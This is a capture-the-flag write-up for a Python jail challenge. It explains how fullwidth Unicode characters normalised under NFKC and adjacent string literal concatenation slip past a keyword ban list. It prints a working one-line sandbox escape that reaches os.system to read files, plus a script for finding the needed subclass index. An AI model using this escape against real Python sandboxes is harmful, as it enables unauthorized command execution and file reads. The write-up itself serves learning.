# No Builtins?

## Description

> I'm pretty sure you can't write unsafe code to steal my flag...

[challenge](jail.py)

## Solution

The jail `exec()`s our input with `{'__builtins__': {}}` and bans strings like `__class__`, `__globals__`, `system`, `os`, `cat`, `flag`, etc. Length is capped at 99.

- Python normalizes identifiers via NFKC before `exec()`. Fullwidth characters like `ｃ` (U+FF43) normalize to `c` (U+0063) so `__ｃlass__` becomes `__class__` after the ban check passes.
- `'sys''tem'` is two adjacent string literals parsed as one token which avoids the `system` ban at check time but resolves to `'system'` at runtime.

```python
1 .__ｃlass__.__base__.__subｃlasses__()[156].clｏse.__ｇlobals__['sys''tem']('nl ../*')
```

| Part | Why |
|------|------|
| `__ｃlass__` | Fullwidth `ｃ` avoids `__class__` ban |
| `__subｃlasses__` | Fullwidth `ｃ` avoids `__subclasses__` ban |
| `[156]` | Index of `os._wrap_close` in Python 3.12-slim |
| `clｏse` | (felt like it but `close` isn't banned) |
| `__ｇlobals__` | Fullwidth `ｇ` avoids `__globals__` ban |
| `'sys''tem'` | Concatenation avoids `system` ban |
| `'nl ../*'` | `nl` instead of `cat`, print everything in that dir to avoid flag ban |

Subclass index varies by Python version. To find it locally:

```sh
docker run --rm python:3.12-slim python3 -c "
subs = ().__class__.__base__.__subclasses__()
for i, c in enumerate(subs):
    if hasattr(c, 'close') and hasattr(c.close, '__globals__') and 'system' in c.close.__globals__:
        print(f'Index {i}: {c}')
"
```

`encryptid{n0_bu1lt1ns_n0_pr0bl3m!}`